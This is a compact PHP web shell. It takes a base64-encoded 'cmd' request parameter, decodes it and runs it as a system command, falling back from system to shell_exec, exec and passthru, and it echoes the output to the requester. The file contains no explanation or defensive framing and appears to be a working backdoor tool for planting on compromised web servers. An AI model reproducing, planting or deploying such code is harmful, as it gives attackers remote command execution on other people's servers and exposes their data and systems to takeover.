<?php
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		system($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	elseif(is_callable('shell_exec'))
		$out = shell_exec($c);
	elseif(is_callable('exec')) 
		exec($c,$r);	
	elseif(is_callable('passthru')) {
		ob_start();
		passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	return $out;
}

if(isset($_REQUEST['cmd'])){
	$cmd = base64_decode($_REQUEST['cmd']);
	echo exe($cmd);
}
die("");
?>